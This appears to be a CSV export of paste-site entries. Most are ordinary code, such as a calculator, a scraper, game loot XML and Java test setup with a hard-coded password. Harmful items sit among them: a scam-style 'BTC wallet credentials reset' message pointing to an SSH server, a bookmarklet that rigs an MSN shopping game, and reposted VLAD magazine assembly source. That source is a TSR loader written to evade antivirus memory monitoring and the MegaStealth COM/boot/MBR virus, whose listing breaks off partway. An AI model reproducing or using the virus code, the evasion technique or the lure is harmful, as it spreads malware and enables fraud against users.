id,title,username,language,date,content
bRKxpa5r,BTC Wallet Credentials have been reset,windpspell_53,GetText,Thursday 29th of June 2023 12:51:54 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
spoznajniq8:K8tX4P on 45.9.148.244
You can connect via SSH or use an online client such as ssheasy.com.
Regards"
vnU4xBh5,kalkulator,Hanafi112,HTML,Thursday 29th of June 2023 12:24:30 AM CDT,"<!DOCTYPE html>
<html>
<head>
    <title>Kalkulator</title>
    <style>
        .calculator {
            width: 250px;
            margin: 0 auto;
            padding: 40px;
            border: 1px solid #ccc;
            border-radius: 4px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 10px;
        }
        .calculator input[type=""text""] {
            grid-column: 1 / span 3;
            width: 100%;
            margin-bottom: 10px;
            padding: 10px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .calculator input[type=""button""] {
            width: 100%;
            padding: 10px;
            font-size: 18px;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class=""calculator"">
        <input type=""text"" id=""result"" readonly>
        <input type=""button"" value=""1"" onclick=""appendToResult('1')"">
        <input type=""button"" value=""2"" onclick=""appendToResult('2')"">
        <input type=""button"" value=""3"" onclick=""appendToResult('3')"">
        <input type=""button"" value=""4"" onclick=""appendToResult('4')"">
        <input type=""button"" value=""5"" onclick=""appendToResult('5')"">
        <input type=""button"" value=""6"" onclick=""appendToResult('6')"">
        <input type=""button"" value=""7"" onclick=""appendToResult('7')"">
        <input type=""button"" value=""8"" onclick=""appendToResult('8')"">
        <input type=""button"" value=""9"" onclick=""appendToResult('9')"">
        <input type=""button"" value=""0"" onclick=""appendToResult('0')"">
        <input type=""button"" value=""C"" onclick=""clearResult()"">
        <input type=""button"" value=""+"" onclick=""appendToResult('+')"">
        <input type=""button"" value=""-"" onclick=""appendToResult('-')"">
        <input type=""button"" value=""*"" onclick=""appendToResult('*')"">
        <input type=""button"" value=""="" onclick=""calculateResult()"">
        <input type=""button"" value=""/"" onclick=""appendToResult('/')"">
    </div>

    <script>
        function appendToResult(value) {
            document.getElementById('result').value += value;
        }

        function clearResult() {
            document.getElementById('result').value = '';
        }

        function calculateResult() {
            var result = eval(document.getElementById('result').value);
            document.getElementById('result').value = result;
        }
    </script>
</body>
</html>
"
hfb32Bj9,BuildJsonAfterBuild,cepxuozab,C++,Thursday 29th of June 2023 12:11:06 AM CDT,"void AfterBuild() {
        (json::Builder{}.Value(""s""s).Key(""1""s).Build(), std::logic_error);
        (json::Builder{}.Value(""s""s).Value(""1""s).Build(), std::logic_error);
        (json::Builder{}.Value(""s""s).StartDict().Build(), std::logic_error);
        (json::Builder{}.Value(""s""s).StartArray().Build(), std::logic_error);
        (json::Builder{}.Value(""s""s).EndDict().Build(), std::logic_error);
        (json::Builder{}.Value(""s""s).EndArray().Build(), std::logic_error);
    }"
L2t3uaBL,Untitled,videns,Java,Wednesday 28th of June 2023 11:56:25 PM CDT,"/*
 * Copyright 2017-2019 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package test.com.demo.leak.search.bank;

import com.zaxxer.hikari.HikariDataSource;
import org.junit.jupiter.api.extension.AfterAllCallback;
import org.junit.jupiter.api.extension.BeforeAllCallback;
import org.junit.jupiter.api.extension.ExtensionContext;
import org.springframework.boot.jdbc.DataSourceBuilder;
import org.springframework.jdbc.core.JdbcOperations;
import org.springframework.jdbc.core.JdbcTemplate;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.images.builder.ImageFromDockerfile;

import javax.sql.DataSource;
import java.io.File;


public final class PostgresqlServerExtension implements BeforeAllCallback, AfterAllCallback {

    private static GenericContainer container = new GenericContainer(
            new ImageFromDockerfile()
                    .withFileFromFile(""Dockerfile"", new File(""docker/db.dockerfile""))
                    .withFileFromFile(""CreateDB.sql"", new File(""CreateDB.sql"")))
            .withEnv(""POSTGRES_PASSWORD"", ""test1234"")
            .withExposedPorts(5432);

    private HikariDataSource dataSource;

    private JdbcOperations jdbcOperations;

    @Override
    public void afterAll(ExtensionContext context) {
        this.dataSource.close();
        this.container.stop();
    }

    @Override
    public void beforeAll(ExtensionContext context) {
        this.container.start();

        this.dataSource = DataSourceBuilder.create()
                .type(HikariDataSource.class)
                .url(String.format(""jdbc:postgresql://demo-leak-search.com:5432/postgres"", container.getMappedPort(5432)))
                .username(""postgres"")
                .password(""omAjGo1R$0*aOjy1"") //TODO do not forget to remove in production
                .build();

        this.dataSource.setMaximumPoolSize(1);

        this.jdbcOperations = new JdbcTemplate(this.dataSource);
    }

    public JdbcOperations getJdbcOperations() {
        return this.jdbcOperations;
    }

    public DataSource getDataSource() {
        return dataSource;
    }
}
"
kM5q0RNR,Untitled,videns,XML,Wednesday 28th of June 2023 11:55:19 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
	<modelVersion>4.0.0</modelVersion>

	<groupId>com.demo.leak.search</groupId>
	<artifactId>demo-leak-search</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<packaging>jar</packaging>

	<name>demo-leak-search</name>
	<description>Demo project for Spring Boot</description>

	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.0.4.RELEASE</version>
		<relativePath/> <!-- lookup parent from repository demo-leak-search.io -->
	</parent>

	<properties>
		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
		<project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
		<java.version>1.8</java.version>
	</properties>

	<dependencies>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-jdbc</artifactId>
		</dependency>
		<dependency>
			<groupId>org.postgresql</groupId>
			<artifactId>postgresql</artifactId>
			<scope>runtime</scope>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.testcontainers</groupId>
			<artifactId>postgresql</artifactId>
			<version>1.11.1</version>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.junit.jupiter</groupId>
			<artifactId>junit-jupiter-api</artifactId>
			<scope>test</scope>
		</dependency>
	</dependencies>

	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
			</plugin>
		</plugins>
	</build>


</project>"
yysESQEm,Clight_33_ExplanatoryDictionary,TwinFrame,C#,Wednesday 28th of June 2023 11:38:33 PM CDT,"using System.Linq;

class Program
{
	static void Main()
	{
		const ConsoleKey CommandFindDescription = ConsoleKey.F1;
		const ConsoleKey CommandExit = ConsoleKey.F2;

		ConsoleKey userInput;
		bool isContinue = true;

		Dictionary<string, string> simpsons = new Dictionary<string, string>();

		simpsons.Add(""Гомер"", ""глава семейства. Человек невероятно выносливый и везучий, ему удается практически любое начинание, за которое он берется, но... по-своему. К сожалению, он имеет легкое слабоумие, и его попытки думать ничем хорошим не заканчиваются."");
		simpsons.Add(""Мардж"", ""жена Гомера и мать троих детей. Женщина, незаметно для себя подавившая множество своих талантов и желаний, чтобы стать образцовой женой, матерью, домохозяйкой. Она не осознает, но иногда начинает догадываться, что могла бы иметь лучшую жизнь при каком-то другом раскладе."");
		simpsons.Add(""Барт"", ""старший из детей. Мальчик, не получавший достаточно поддержки за свои лучшие начинания, часто остававшийся непонятым, обиженным, а потому нашедший себя в постоянном хулиганстве. Его дурное поведение – протест обществу, которое хочет от него слишком много и никогда не остается довольным, даже если он старается."");
		simpsons.Add(""Лиза"", ""средняя из детей. Непонятый гений. В свои 8 лет она является виртуозным музыкантом, самым преуспевающим учеником школы, активисткой экологических движений, автором нескольких научных открытий... Поэтому общество ее ненавидит."");
		simpsons.Add(""Мэгги"", ""младшая из детей, ей меньше года, поэтому ограничена в проявлениях себя. Еще не разговаривает и плохо ходит. Однако она идеальный младенец – почти никогда не плачет, ведет себя невероятно самостоятельно и демонстрирует необычайную стойкость."");

		while (isContinue)
		{
			Console.Clear();
			Console.WriteLine($""{CommandFindDescription.ToString()} - Найти описание членов семьи Симпсонов."");
			Console.WriteLine($""{CommandExit.ToString()} - Выйти."");

			userInput = Console.ReadKey().Key;

			switch (userInput)
			{
				case CommandFindDescription:
					FindDescription(simpsons);
					break;

				case CommandExit:
					isContinue = false;
					break;
			}
		}
	}

	static void FindDescription(Dictionary<string, string> dictionary)
	{
		string userInput;

		Console.Clear();
		Console.Write(""Введите имя персонажа: "");
		userInput = Console.ReadLine();

		if (dictionary.ContainsKey(userInput))
		{
			ShowDescription(dictionary, userInput);
		}
		else
		{
			ShowMessage($""Персонажа с именем {userInput} не найдено."");
		}
	}

	static void ShowDescription(Dictionary<string, string> dictionary, string key)
	{
		ShowMessage($""{key} - {dictionary[key]}"");
	}

	static void ShowMessage(string message)
	{
		Console.Clear();
		Console.WriteLine(message);
		Console.WriteLine(""\nДля продолжения нажмите любую клавишу."");
		Console.ReadKey();
	}
}"
dgHY1kV0,(Manual) Msn Shopping Bookmarklet,RohanPhuyal,JavaScript,Wednesday 28th of June 2023 11:36:16 PM CDT,"javascript:(function(){var e=document.querySelector(""shopping-page-base"")?.shadowRoot.querySelector(""shopping-homepage"")?.shadowRoot.querySelector(""msft-feed-layout"")?.shadowRoot.querySelector(""msn-shopping-game-pane"");null!=e?(e.gameSettings.newGameCountdown=0,e.scrollIntoView({behavior: 'smooth'}),e.fetchGameDataFunc=async function(e){return JSON.parse('[{""id"":""46154567668"",""title"":""HUGO BOSS BOSS BOTTLED. NIGHT. Eau De Toilette 200ml Spray"",""dealPercentage"":""1%"",""annotation"":""1%"",""seller"":""The Fragrance Shop"",""imageInfo"":{""altText"":""HUGO BOSS BOSS BOTTLED. NIGHT. Eau De Toilette 200ml Spray"",""sourceImageUrl"":""https://th.bing.com/th?id=OPE.vyeLua8uaC6Jcw300C300&pid=21.1"",""imageTint"":0},""priceInfo"":{""originalPrice"":""£1.00"",""price"":""£1.00"",""priceCurrencySymbol"":""£""},""productAdsScenarioType"":18,""groupingIdType"":3,""groupingId"":""I39JqFOmQioZw8YvP0AVBb6pw4"",""globalOfferId"":""46154567668"",""categoryInfo_2"":{""categoryId"":""4285"",""categoryName"":""Fragrance"",""categoryHierarchy"":""Beauty & Fragrance|Fragrance""},""shippingPrice"":"""",""sourceType"":""xnp"",""brq"":""""}]')},e.getGameResult=function(a){if(a===e.selectedCardIndex)return localStorage.removeItem(""gamesPerDay""),e.dailyLimitReached=!1,e.leaderboardRecord&&(e.leaderboardRecord.dailyGuessingGamesPlayed=0),a===e.selectedCardIndex?""win""===e.gameState?""win"":""lose"":null},e.gameSettings.newGameCountdown=0,e.getGameResult(-1),e.gameState=""win"",e.startCountdown(),e.startCountdown(),setTimeout((()=>{for(var a=0;a<=1e4;a++)clearInterval(a);e.gameSettings.newGameCountdown=6}),2200)):alert(""Unable to locate the shopping game!"");})();"
CEw4m9c9,ppzz5,eleeet,Python,Wednesday 28th of June 2023 11:21:46 PM CDT,"import datetime

class Task:
    def __init__(self, task_id, cen, project, task_name, tag, status, reg, gor_strash, inter, pol, obaz, legk, bist):
        self.task_id = task_id
        self.cen = cen
        self.project = project
        self.task_name = task_name
        self.tag = tag
        self.status = status
        self.reg = reg
        self.gor_strash = gor_strash
        self.inter = inter
        self.pol = pol
        self.obaz = obaz
        self.legk = legk
        self.bist = bist
        self.bist_legk = self.legk + self.bist
        self.prior = (self.legk + self.bist + self.pol + self.obaz*self.obaz) * self.gor_strash
        self.creation_date = datetime.datetime.now()
        self.comments = []

    def change_status(self, new_status):
        self.status = new_status

    def change_tag(self, new_tag):
        self.tag = new_tag

    def add_comment(self, comment):
        self.comments.append(comment)

class Project:
    def __init__(self, project_id, reg, gor_strash, inter, pol, obaz, legk, bist, is_open):
        self.project_id = project_id
        self.reg = reg
        self.gor_strash = gor_strash
        self.inter = inter
        self.pol = pol
        self.obaz = obaz
        self.legk = legk
        self.bist = bist
        self.bist_legk = self.legk + self.bist
        self.prior = (self.legk + self.bist + self.pol + self.obaz*self.obaz) * self.gor_strash
        self.is_open = is_open
        self.tasks = []

    def add_task(self, task):
        self.tasks.append(task)

    def remove_task(self, task):
        self.tasks.remove(task)

    def change_status(self, new_status):
        self.is_open = new_status

class Event:
    def __init__(self, id, task_id, action, attribute, timestamp, project):
        self.id = id
        self.task_id = task_id
        self.action = action
        self.attribute = attribute
        self.timestamp = timestamp
        self.project = project

    def execute(self):
        for task in self.project.tasks:
            if task.id == self.task_id:
                if self.action == ""change"" and self.attribute == ""status"":
                    task.change_status(""done"")  # changing the status
                elif self.action == ""change"" and self.attribute == ""tag"":
                    task.change_tag(""new_tag"")  # changing the tag
                elif self.action == ""add"" and self.attribute == ""comment"":
                    task.add_comment(""new comment"")  # adding a comment
"
R7tQ14gs,Using selenium and BeautifulSoup,anjanesh,Python,Wednesday 28th of June 2023 11:20:14 PM CDT,"from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import time

# Configure Selenium to run in headless mode
chrome_options = Options()
chrome_options.add_argument(""--headless"")

# Set up Selenium WebDriver with the configured options
driver = webdriver.Chrome(options=chrome_options)

url = ""https://adviserinfo.sec.gov/individual/summary/1973578""

# Open the URL using Selenium
driver.get(url)

time.sleep(5)

# Get the page source after dynamic content has loaded
page_source = driver.page_source

# Create a BeautifulSoup object to parse the HTML content
soup = BeautifulSoup(page_source, ""html.parser"")

# Find the span element containing the data
span_element = soup.find(""span"", class_=""text-lg sm:text-sm font-semibold"")

# Extract the data
data = span_element.text.strip() if span_element else None

print(data)

# Close the browser
driver.quit()"
mGy7qA9E,DayZ 1.21 new types.xml,iKurdo,XML,Wednesday 28th of June 2023 11:15:39 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<types>
	<type name=""Crossbow_Autumn"">
		<nominal>5</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>3</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""weapons""/>
		<usage name=""Hunting""/>
	</type>
	<type name=""Crossbow_Black"">
		<nominal>5</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>3</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""weapons""/>
		<usage name=""Town""/>
	</type>
	<type name=""Crossbow_Summer"">
		<nominal>0</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>0</min>
		<quantmin>0</quantmin>
		<quantmax>0</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""weapons""/>
		<usage name=""Hunting""/>
	</type>
	<type name=""Crossbow_Wood"">
		<nominal>3</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""weapons""/>
		<usage name=""Farm""/>
	</type>
	<type name=""Ammo_HuntingBolt"">
		<nominal>25</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>18</min>
		<quantmin>40</quantmin>
		<quantmax>100</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""weapons""/>
		<usage name=""Hunting""/>
	</type>
	<type name=""Ammo_ImprovisedBolt_1"">
		<nominal>0</nominal>
		<lifetime>7200</lifetime>
		<restock>0</restock>
		<min>0</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""1"" deloot=""0""/>
		<category name=""weapons""/>
	</type>
	<type name=""Ammo_ImprovisedBolt_2"">
		<nominal>0</nominal>
		<lifetime>7200</lifetime>
		<restock>0</restock>
		<min>0</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""1"" deloot=""0""/>
		<category name=""weapons""/>
	</type>
	<type name=""Sword"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""Mace"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""Chainmail"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""Chainmail_Coif"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""Chainmail_Leggings"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""NorseHelm"">
		<nominal>0</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>0</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""0"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
	</type>
	<type name=""Chestplate"">
		<nominal>3</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>1</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""MedievalBoots"">
		<nominal>2</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>0</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Historical""/>
	</type>
	<type name=""WoolGlovesFingerless_Black"">
		<nominal>4</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>2</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Police""/>
	</type>
	<type name=""WoolGlovesFingerless_Green"">
		<nominal>4</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>2</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Military""/>
		<value name=""Tier1""/>
		<value name=""Tier2""/>
		<value name=""Tier4""/>
	</type>
	<type name=""WoolGlovesFingerless_Tan"">
		<nominal>4</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>2</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Village""/>
	</type>
	<type name=""WoolGloves_Black"">
		<nominal>10</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>7</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Police""/>
	</type>
	<type name=""WoolGloves_Green"">
		<nominal>12</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>8</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Military""/>
		<value name=""Tier1""/>
		<value name=""Tier2""/>
		<value name=""Tier4""/>
	</type>
	<type name=""WoolGloves_Tan"">
		<nominal>10</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>7</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Village""/>
	</type>
	<type name=""WoolGloves_White"">
		<nominal>22</nominal>
		<lifetime>14400</lifetime>
		<restock>0</restock>
		<min>16</min>
		<quantmin>-1</quantmin>
		<quantmax>-1</quantmax>
		<cost>100</cost>
		<flags count_in_cargo=""0"" count_in_hoarder=""0"" count_in_map=""1"" count_in_player=""0"" crafted=""0"" deloot=""0""/>
		<category name=""clothes""/>
		<usage name=""Town""/>
	</type>
</types>"
Xih5dkJQ,VLAD Magazine - Issue #3 - ARTICLE.5_3 - Catch-22 TSR Loader Source Code,FlyFar,ASM (NASM),Wednesday 28th of June 2023 11:05:23 PM CDT,"; Catch-22, a TSR loader by Rhincewind [Vlad]
;
; This is probably the most experimental thing I've done so far. In this 
; loader I've combined a few things I learned about tbmem into a pretty 
; neat loader that the current version of tbmem will not detect.
;
; The highloader is pretty straightforward, although it does use one
; trick I found. It traces the PSP chain all the way back to the command
; interpreter, then makes that PSP active before a block is allocated for
; the loader. This so-called 'context switching' will make the newly
; allocated block property of your command interpreter, ensuring it's
; lasting residency. Down with direct MCB twiddling!
;
; Now tbmem comes into play. First, two facts:
;
; Fact 1 - Tbmem detects residency on vectorchanges only. It can't be
;          bothered to look at the memory itself.
; Fact 2 - Tbmem does not flag on intel reserved registers being hooked.
;
; For starters the loader will hook int3, thereby not alerting tbmem as
; above. The first byte of the int28 handler, which is an IRET in the
; original handler, will be overwritten
; with an int3. Now, as you probably know, only the command
; interpreter calls int28 (Okay, so do Terminate and a handful of other
; programs, watch out for those) which is redirected to our routine.
; We managed to get a routine active around tbmem! Hurray! Now, the int3
; handler will countdown 75 times, 13 is the minimum btw, to make sure
; that we're back in command mode, that is, out of the dos deallocation
; routines before we hook int21, which again, will elude tbmem. Both int28 
; and int3 are restored and we're done with our loader.

                .model tiny
                .code
                org 100h
parasize        equ (endloader-start)
start:
                mov ax, 'TB'
                int 21h
                cmp ax, 'AV'
                jz exit_tsr
                mov ah, 4ah
                mov bx,-1
                push ax
                int 21h
                pop ax
                sub bx, parasize+2
                int 21h
                xor si,si
nextpsp:
                cmp bx, word ptr ds:[si+16h]
                mov bx, word ptr ds:[si+16h]
                mov ds,bx
                jnz nextpsp
found_cmd:
                mov ah, 50h
                int 21h
                mov ah, 48h
                mov bx,parasize+1
                int 21h
                mov es,ax
                mov ah, 50h
                mov bx,cs
                int 21h
                push cs
                pop ds
                mov si, 100h
                xor di,di
                mov cx, endloader-start
                rep movsb
                mov ds,cx
                mov si, 3*4
                movsw
                movsw
                cli
                mov word ptr [si-4],offset install_21-100h
                mov word ptr [si-2],es
                sti
                mov si, 28h*4
                movsw
                movsw
                mov ax,75h
                stosw
                mov word ptr es:[di],75h
                lds bx, dword ptr ds:[si-4]
                mov al, 0cch
                xchg byte ptr ds:[bx],al
                stosb
                ;Restore all registers here, including DS&ES
exit_tsr:                
                int 20h
install_21:     
                dec word ptr cs:counter-100h
                jnz exit_int3
                push ax
                push di
                push ds
                push es
                xor ax,ax
                mov ds,ax
                les di, dword ptr cs:int2offset-100h
                mov al, byte ptr cs:orgbyte-100h
                stosb
                cli
                les di, dword ptr cs:intoffset-100h
                mov word ptr ds:[0ch],di
                mov word ptr ds:[0eh],es
                mov ax,offset int21-100h
                xchg ax, word ptr ds:[84h]
                mov cs:intoffset-100h,ax
                mov ax,cs
                xchg ax, word ptr ds:[86h]
                mov cs:intseg-100h,ax
                sti
                pop es
                pop ds
                pop di
                pop ax
exit_int3:                
                add sp,6
                iret
;Replace the handler below with your k-rad virus code.
int21:
                cmp ax,'TB'
                jnz return_int
                mov ax, 'AV'
                iret
return_int:                
                jmp dword ptr cs:intoffset-100h
endloader:
intoffset      dw ?
intseg         dw ?
int2offset     dw ?
int2seg        dw ?
counter        dw ?
orgbyte        db ?

                end start"
yTu56mi4,VLAD Magazine - Issue #3 - Article.5_5 - MegaStealth Virus - Source Code,FlyFar,ASM (NASM),Wednesday 28th of June 2023 11:03:46 PM CDT,";       MegaStealth Virus Source by qark
;
;       COM/BS/MBR Infector
;       It uses the new form of stealth developed by the 'strange' virus in
;       that even if you are using the original ROM int 13h the virus will
;       still successfully stealth.  It does this by hooking the hard disk
;       IRQ, int 76h, and checking the ports for a read to the MBR.  If the
;       MBR is being read, the ports will be changed to cause a read from
;       sector four instead.
;
;       Noone has the 'strange' virus (and believe me, every VX BBS in the
;       world has been checked), so I decided to develop the technology
;       independently and make the information public.
;




	org     0

	cld
	mov     ax,cs
	or      ax,ax
	jz      bs_entry
	jmp     com_entry

;------------------- Boot Sector Stub ----------------
Marker  db      '[MegaStealth] by qark/VLAD',0

bs_entry:
	xor     ax,ax
	mov     si,7c00h
	cli
	mov     ss,ax
	mov     sp,si
	sti
	mov     es,ax
	mov     ds,ax

	;CS,DS,ES,SS,AX=0    SI,SP=7C00H
	
	sub     word ptr [413h],2       ;Allocate 2k of memory.

	int     12h                     ;Get memory into AX.

	mov     cl,6
	shl     ax,cl
	mov     es,ax

	mov     ax,202h
	xor     bx,bx
	xor     dh,dh
	mov     cx,2
	or      dl,dl
	js      hd_load

	db      0b9h                    ;MOV CX,xxxx
	floppy_sect     dw      0
	db      0b6h                    ;MOV DH,xx
	floppy_head     db      0

hd_load:
	int     13h                     ;Read our virus in.

	mov     si,13h*4
	mov     di,offset i13
	movsw
	movsw
	mov     word ptr [si-4],offset handler
	mov     word ptr [si-2],es

	mov     byte ptr es:set_21,0
	
	;Test for an 8088.
	mov     al,2
	mov     cl,33
	shr     al,cl
	test    al,1
	jz      no_int76                ;8088 doesn't use int76

	mov     si,76h*4                ;Set int76
	mov     di,offset i76
	movsw
	movsw
	mov     word ptr [si-4],offset int76handler
	mov     word ptr [si-2],es

	mov     byte ptr es:llstealth_disable,0

no_int76:
	int     19h                     ;Reload the original bootsector.

;------------------- COM Stub ----------------

com_entry:

	db      0beh                    ;MOV SI,xxxx
	delta   dw      100h

	mov     ax,0f001h
	int     13h

	cmp     ax,10f0h
	je      resident

	mov     ax,ds
	dec     ax
	mov     ds,ax

	cmp     byte ptr [0],'Z'
	jne     resident

	sub     word ptr [3],7dh
	sub     word ptr [12h],7dh
	mov     ax,word ptr [12h]

	push    cs
	pop     ds
	mov     es,ax
	xor     di,di
	
	push    si

	mov     cx,1024
	rep     movsb

	xor     ax,ax                   ;Set int13
	mov     ds,ax
	mov     si,13h*4
